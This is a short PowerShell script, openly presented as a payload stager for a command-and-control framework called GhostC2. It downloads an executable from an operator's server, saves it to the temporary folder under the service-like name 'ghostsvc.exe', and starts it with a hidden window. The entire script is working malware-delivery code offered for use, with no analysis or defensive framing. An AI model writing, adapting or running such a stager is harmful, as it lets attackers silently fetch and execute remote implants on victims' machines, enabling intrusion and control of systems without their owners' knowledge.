# 💉 PowerShell Payload Stager for GhostC2

# URL of the remote GhostC2 payload (host this on your server)
$payloadUrl = "http://your.server.ip/builds/ghost_payload.exe"

# Local path to save the downloaded payload
$localPath = "$env:TEMP\ghostsvc.exe"

# Download the file silently
try {
    Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "[!] Failed to download payload."; exit 1
}

# Start the payload hidden
Start-Process -FilePath $localPath -WindowStyle Hidden
